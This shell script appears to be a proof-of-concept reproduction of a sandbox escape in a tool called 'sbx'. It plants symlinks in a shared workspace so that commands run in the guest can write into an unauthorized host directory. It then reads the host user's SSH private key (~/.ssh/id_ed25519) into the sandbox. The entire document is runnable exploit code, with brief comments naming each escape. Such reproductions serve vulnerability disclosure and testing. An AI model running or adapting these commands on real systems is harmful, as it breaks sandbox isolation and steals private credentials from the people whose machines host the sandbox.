#!/bin/sh
set -eu

SANDBOX_NAME="repro"
WORKSPACE="/Users/${USER}/sbxlab/repro/work"
HOST_SECRET_DIR="/Users/${USER}/sbxlab/repro/secret"

# 1. Host write escape: plant workspace symlink targeting unauthorized host directory
sbx exec "${SANDBOX_NAME}" -- sh -c "mkdir -p /tmp/out && echo 'OWNED-BY-THE-SANDBOX' > /tmp/out/notes.txt && ln -sfn '${HOST_SECRET_DIR}' '${WORKSPACE}/results'"
sbx cp "${SANDBOX_NAME}:/tmp/out/notes.txt" "${WORKSPACE}/results/"

# 2. Host read escape: plant parent-component symlink inside workspace to pull host SSH/secret file into guest
sbx exec "${SANDBOX_NAME}" -- sh -c "mkdir -p /tmp/in && ln -sfn '/Users/${USER}/.ssh' '${WORKSPACE}/vendor'"
sbx cp "${WORKSPACE}/vendor/id_ed25519" "${SANDBOX_NAME}:/tmp/in/"
